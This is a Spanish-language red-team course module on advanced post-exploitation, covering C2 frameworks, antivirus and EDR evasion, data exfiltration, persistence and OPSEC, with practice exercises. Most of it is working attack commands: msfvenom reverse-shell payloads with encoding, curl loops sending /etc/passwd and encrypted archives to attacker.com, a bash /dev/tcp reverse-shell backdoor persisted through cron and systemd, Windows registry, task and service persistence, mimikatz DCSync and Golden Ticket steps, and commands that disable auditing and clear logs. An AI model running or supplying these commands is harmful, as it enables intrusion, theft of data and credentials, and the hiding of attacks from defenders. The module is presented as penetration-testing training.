---
title: "12 — Post-Exploación Avanzada"
description: "12 — Post-Exploación Avanzada"
---

# 12 — Post-Exploación Avanzada

> 🎯 **Objetivo:** dominar las técnicas avanzadas de post-explotación que usan los equipos Red Team profesionales: C2 frameworks, evasión de defensas, exfiltración de datos y persistencia avanzada.

## 1. C2 Frameworks (Command & Control)

### 1.1 ¿Qué es un C2?

Un **Command and Control (C2)** es un framework que permite comunicarte con sistemas comprometidos de forma sigilosa, escalable y persistente.

```
┌─────────────────────────────────────────────────────────┐
│                   ARQUITECTURA C2                       │
├─────────────────────────────────────────────────────────┤
│                                                         │
│   [Attacker] ──── C2 Server ──── [Implant/Agent]       │
│       │              │                    │              │
│       │         ┌────┴────┐              │              │
│       │         │ Listener│              │              │
│       │         │ Profiles│              │              │
│       │         │ Malleable│             │              │
│       │         └─────────┘              │              │
│       │                                  │              │
│       └──────── Comandos ────────────────┘              │
│       └──────── Resultados ───────────────┘              │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 1.2 Comparación de C2 Frameworks

| Framework | Tipo | Ventajas | Desventajas |
|-----------|------|----------|-------------|
| **Cobalt Strike** | Comercial | El estándar de la industria, malleable profiles | $3,500+/año |
| **Sliver** | Open Source | Gratuito, multiplatform, moderno | Menos documentación |
| **Havoc** | Open Source | Moderno, bypass EDR, community | Reciente |
| **Mythic** | Open Source | Modular, multi-agent | Complejo de configurar |
| **Brute Ratel** | Comercial | Bypass EDR avanzado | $2,000+/año |
| **Empire** | Open Source | PowerShell/Python agents | Descontinuado |

### 1.3 Sliver - C2 Gratuito

```bash
# Instalar Sliver
go install github.com/BishopFox/sliver/client@latest

# Generar implant
sliver> generate --os windows --arch amd64 --save /tmp/implant.exe

# Generar implante HTTP
sliver> generate --os windows --arch amd64 --http http://192.168.1.100:8080 --save /tmp/http-implant.exe

# Generar implante DNS
sliver> generate --os windows --arch amd64 --dns mydomain.com --save /tmp/dns-implant.exe

# Iniciar listener
sliver> http

# Ver sesiones
sliver> sessions

# Interactuar con sesión
sliver> use <session-id>

# Comandos en la sesión
sliver> whoami
sliver> ls
sliver> download C:\Users\admin\Documents\secret.txt
```

### 1.4 Cobalt Strike - El Estándar

```bash
# Malleable C2 Profile
# Permite disfrazar el tráfico C2 como tráfico legítimo

# Profile de ejemplo (simula tráfico de Amazon)
set "Amazon-CloudFront" "Profile";

# Configurar listener
listeners
http
set Host "192.168.1.100"
set Port "443"
set BindPort "443"
save

# Generar payload
generate
set format exe
set host "192.168.1.100"
set port "443"
set payload "windows/x64/meterpreter/reverse_https"
save
```

## 2. Evasión de Defensas

### 2.1 Tipos de Defensas

```
┌─────────────────────────────────────────────────────────┐
│                 DEFENSAS A EVADIR                       │
├─────────────────────────────────────────────────────────┤
│  1. AV (Antivirus) - Firma, heurística, sandbox        │
│  2. EDR (Endpoint Detection) - Comportamiento, memoria  │
│  3. NGFW (Firewall) - Inspección profunda de paquetes   │
│  4. IDS/IPS - Firma, anomalias, correlación             │
│  5. SIEM - Correlación de eventos, alertas              │
│  6. AppLocker/WDAC - Control de aplicaciones            │
│  7. Credential Guard - Protección de credenciales       │
└─────────────────────────────────────────────────────────┘
```

### 2.2 Técnicas de Evasión de AV

```bash
# === ENCODING ===
# Usar msfvenom con encoding
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell_encoded.exe

# === OBFUSCACIÓN ===
# PowerShell obfuscado
powershell -Enc [Base64 encoded payload]

# Python obfuscado
# Usar pyarmor o ofuscat

# === ENCRYPTION ===
# Cifrar payload
openssl enc -aes-256-cbc -in payload.exe -out payload.enc

# === PACKING ===
# Usar UPX para empaquetar
upx -9 payload.exe -o payload_packed.exe

# === CUSTOM PAYLOADS ===
# Generar payload customizado
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f csharp
```

### 2.3 Técnicas de Evasión de EDR

```bash
# === BYPASS AMSI (Windows) ===
# 1. Patch AMSI en memoria
# 2. Usar scripts ofuscados
# 3. Cargar assemblies directamente

# === BYPASS ETW (Event Tracing) ===
# 1. Patch ETW provider
# 2. Usar técnicas de evasión de logging

# === IN-MEMORY EXECUTION ===
# 1. Cargar DLL en memoria
# 2. Execute-Assembly (Cobalt Strike)
# 3. Unmanaged PowerShell

# === PROCESS INJECTION ===
# 1. DLL Injection
# 2. Process Hollowing
# 3. APC Injection
# 4. Thread Execution Hijacking

# Ejemplo: Process Hollowing en C#
# 1. Crear proceso suspendido
# 2. Mapear imagen legítima
# 3. Inyectar código malicioso
# 4. Reanudar proceso
```

### 2.4 Herramientas de Evasión

| Herramienta | Uso |
|-------------|-----|
| **Veil** | Generar payloads que evaden AV |
| **Shellter** | Inyectar código en ejecutables legítimos |
| **Metasploit** | Payloads con encoding y ofuscación |
| **Cobalt Strike** | Malleable profiles para evadir EDR |
| **Sliver** | Profiles de evasión integrados |
| **Donut** | Generar payloads .NET en memoria |

## 3. Exfiltración de Datos

### 3.1 Métodos de Exfiltración

```bash
# === EXFILTRACIÓN POR DNS ===
# DNS tunneling - ocultar datos en consultas DNS
# Herramientas: dnscat2, iodine, DNSExfiltrator

# Ejemplo con dnscat2
# Server
dnscat2-server corp.local

# Client
dnscat2 corp.local

# === EXFILTRACIÓN POR HTTP/S ===
# Enviar datos en peticiones HTTP
# Usar form-data, cookies, headers personalizados

# Ejemplo con curl
curl -X POST http://attacker.com/exfil -d @/etc/passwd

# === EXFILTRACIÓN POR ICMP ===
# Encapsular datos en paquetes ICMP
# Herramientas: icmpsh, HANS

# === EXFILTRACIÓN POR STEGANOGRAFÍA ===
# Ocultar datos en imágenes
# Herramientas: steghide, zsteg, OpenStego

# Ejemplo con steghide
steghide embed -cf imagen.jpg -ef datos.txt -p "password"

# === EXFILTRACIÓN POR EMAIL ===
# Enviar datos como adjuntos
# Encriptar y enviar por email legítimo

# === EXFILTRACIÓN POR CLOUD ===
# Subir datos a servicios cloud
# Google Drive, Dropbox, OneDrive, S3
```

### 3.2 Técnicas de Exfiltración Sigilosa

```bash
# === COMPRESSION Y ENCRYPTION ===
# Comprimir y cifrar antes de exfiltrar
tar czf - /sensitive/data | openssl enc -aes-256 -pass pass:key | curl -X POST -d @- http://attacker.com/exfil

# === CHUNKING ===
# Dividir archivos grandes en partes
split -b 1M datos.tar.gz chunk_
for chunk in chunk_*; do
  curl -X POST http://attacker.com/exfil -d @$chunk
done

# === STAGGERING ===
# Enviar datos en intervalos para evitar detección
# Ejemplo: cada 5 minutos
while true; do
  curl -X POST http://attacker.com/exfil -d @chunk_$(date +%s).txt
  sleep 300
done

# === PROTOCOL MIXING ===
# Usar múltiples protocolos
# HTTP para datos pequeños, DNS para metadatos, ICMP para confirmaciones
```

### 3.3 Herramientas de Exfiltración

| Herramienta | Método |
|-------------|--------|
| **dnscat2** | DNS tunneling |
| **iodine** | DNS tunneling |
| **PowerShell** | HTTP/HTTPS |
| **Curl/Wget** | HTTP/HTTPS |
| **Netcat** | TCP directo |
| **steghide** | Esteganografía |
| **Rclone** | Cloud sync |

## 4. Persistencia Avanzada

### 4.1 Persistencia en Linux

```bash
# === CRON JOBS ===
# Agregar tarea cada 5 minutos
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.backdoor") | crontab -

# === SYSTEMD SERVICE ===
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=System Service

[Service]
Type=simple
ExecStart=/tmp/.backdoor
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor.service
systemctl start backdoor.service

# === SSH KEYS ===
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# === LD_PRELOAD ===
echo "/tmp/.malicious.so" > /etc/ld.so.preload

# === BASHRC INJECTION ===
echo "nohup /tmp/.backdoor &" >> ~/.bashrc

# === PAM BACKDOOR ===
# Modificar PAM para mantener acceso
# Usar pam_permit.so para login sin contraseña

# === INIT SCRIPTS ===
# Agregar script en /etc/rc.local
echo "/tmp/.backdoor" >> /etc/rc.local
```

### 4.2 Persistencia en Windows

```bash
# === REGISTRY RUN KEYS ===
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "update" /d "C:\Temp\backdoor.exe" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "update" /d "C:\Temp\backdoor.exe" /f

# === SCHEDULED TASKS ===
schtasks /create /tn "update" /tr "C:\Temp\backdoor.exe" /sc hourly /st 00:00

# === WINDOWS SERVICES ===
sc create "SystemUpdate" binPath= "C:\Temp\backdoor.exe" start= auto
sc start "SystemUpdate"

# === STARTUP FOLDER ===
copy backdoor.exe "C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"

# === DLL HIJACKING ===
# Reemplazar DLL legítima con versión maliciosa
# En directorios donde la app busca DLLs

# === WMI EVENT SUBSCRIPTION ===
# Crear evento que ejecute código cada 60 segundos
wmic /namespace:\\root\subscription PATH __EventFilter CREATE EventNameSpace="root\cimv2",QueryLanguage="WQL",Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
```

### 4.3 Persistencia Avanzada

```bash
# === FIRMWARE ROOTKIT ===
# Modificar BIOS/UEFI
# Muy avanzado, raramente usado en pentesting

# === BOOTKIT ===
# Modificar MBR/VBR
# Sobrevive reinstalación de SO

# === HARDWARE IMPLANT ===
# USB Rubber Ducky
# WiFi Pineapple
# LAN Turtle

# === DOMAIN PERSISTENCE ===
# Golden Ticket (Active Directory)
# DCSync para obtener credenciales de dominio
# Crear usuario backdoor en AD

# Ejemplo: Golden Ticket
# 1. Obtener KRBTGT hash
mimikatz # lsadump::dcsync /user:krbtgt

# 2. Crear Golden Ticket
mimikatz # kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ticket:golden.kirbi
```

## 5. Operational Security (OPSEC)

### 5.1 Reglas OPSEC para Red Team

```
┌─────────────────────────────────────────────────────────┐
│                REGLAS OPSEC DEL RED TEAM                 │
├─────────────────────────────────────────────────────────┤
│  1. NUNCA uses tools estándar de Metasploit              │
│  2. SIEMPRE ofusca y cifra payloads                     │
│  3. USA protocolos legítimos (HTTP, DNS, HTTPS)         │
│  4. EVITA generar artefactos en disco                    │
│  5. USA execución en memoria cuando sea posible          │
│  6. MONITorea tu propio tráfico para detectar patrones   │
│  7. ROTATIONAL de IPs, tools y técnicas                  │
│  8. DOCUMENTA todo para el reporte                       │
│  9. LIMPIA todos los artefactos al final                 │
│  10. VERIFICA que no留下了 rastros                       │
└─────────────────────────────────────────────────────────┘
```

### 5.2 Técnicas OPSEC

```bash
# === EVASIÓN DE LOGGING ===
# Deshabilitar logging
auditctl -e 0           # Linux audit
powershell Set-ExecutionPolicy Bypass

# Limpiar logs
wevtutil cl Security
wevtutil cl System
journalctl --rotate && journalctl --vacuum-time=1s

# === CAMUFLAJE DE TRÁFICO ===
# Usar puertos legítimos
# TLS con certificados válidos
# Malleable C2 profiles

# === LIMPIEZA DE ARTEFACTOS ===
# Linux
rm -f /tmp/.backdoor
history -c
unset HISTFILE

# Windows
del /f /q C:\Temp\backdoor.exe
powershell "Remove-EventLog -LogName Security"
wevtutil cl Security
```

## 6. Ejercicios Prácticos

### Ejercicio 1: Configurar C2 con Sliver

```bash
# 1. Instalar Sliver
go install github.com/BishopFox/sliver/client@latest

# 2. Generar implante HTTP
sliver> generate --os windows --arch amd64 --http http://192.168.1.100:8080 --save /tmp/http.exe

# 3. Iniciar listener
sliver> http

# 4. Ejecutar implante en target
# (En el target)
C:\Temp\http.exe

# 5. Verificar conexión
sliver> sessions
sliver> use <session-id>
sliver> whoami
```

### Ejercicio 2: Evasión de AV

```bash
# 1. Generar payload básico
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
# (Detectado por AV)

# 2. Generar payload con encoding
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell_encoded.exe
# (Puede evadir AV básico)

# 3. Generar payload C#
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f csharp
# (Ejecutar con execute-assembly en Cobalt Strike)

# 4. Usar Shellter para inyectar en legítimo
shellter
# Seleccionar archivo legítimo
# Seleccionar payload
# Generar
```

### Ejercicio 3: Exfiltración por DNS

```bash
# 1. Configurar dnscat2 server
dnscat2-server corp.local

# 2. Ejecutar dnscat2 client en target
dnscat2 corp.local

# 3. En la sesión dnscat2
dnscat2> download /etc/passwd
dnscat2> upload payload.exe

# 4. Verificar que los datos llegaron al server
```

### Ejercicio 4: Persistencia Linux

```bash
# 1. Crear script de backdoor
cat > /tmp/.backdoor << 'EOF'
#!/bin/bash
while true; do
  /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
  sleep 60
done
EOF
chmod +x /tmp/.backdoor

# 2. Agregar a cron
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.backdoor") | crontab -

# 3. Verificar persistencia
crontab -l

# 4. Reiniciar y verificar que funciona
```

### Ejercicio 5: Reporte OPSEC

```markdown
# Reporte de Post-Exploación

## Técnicas Utilizadas
| # | Técnica | Herramienta | Resultado |
|---|---------|-------------|-----------|
| 1 | C2 Setup | Sliver | Conexión establecida |
| 2 | Evasion | Shellter + Encoding | AV bypassed |
| 3 | Exfiltration | dnscat2 | Datos exfiltrados |
| 4 | Persistence | Cron + SSH | Acceso mantenido |

## OPSEC Score
- Evasión de AV: 8/10
- Evasión de EDR: 6/10
- Limpieza: 9/10
- Documentación: 10/10

## Recomendaciones
1. Usar C2 con malleable profiles
2. Implementar execución en memoria
3. Limpiar todos los artefactos
```

## 7. Referencias y Recursos

| Recurso | Descripción |
|---------|-------------|
| [Sliver](https://github.com/BishopFox/sliver) | C2 framework gratuito |
| [Cobalt Strike](https://www.cobaltstrike.com/) | C2 profesional |
| [Havoc](https://github.com/HavocFramework/Havoc) | C2 moderno |
| [MITRE ATT&CK](https://attack.mitre.org/) | Framework de tácticas |
| [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) | Colección de payloads |
| [The Hacker Recipes](https://www.thehacker.recipes/) | Guías de AD hacking |

## 📌 Checkpoint final

Antes de avanzar, verifica que puedas:

- [ ] Configurar un C2 básico con Sliver
- [ ] Generar payloads que evadan AV
- [ ] Exfiltrar datos por DNS tunneling
- [ ] Establecer persistencia en Linux y Windows
- [ ] Implementar reglas OPSEC
- [ ] Documentar técnicas para el reporte

> ⏭️ **Siguiente:** [`06-forense-digital.md`](./06-forense-digital.md) — Cómo investigar y analizar incidentes.
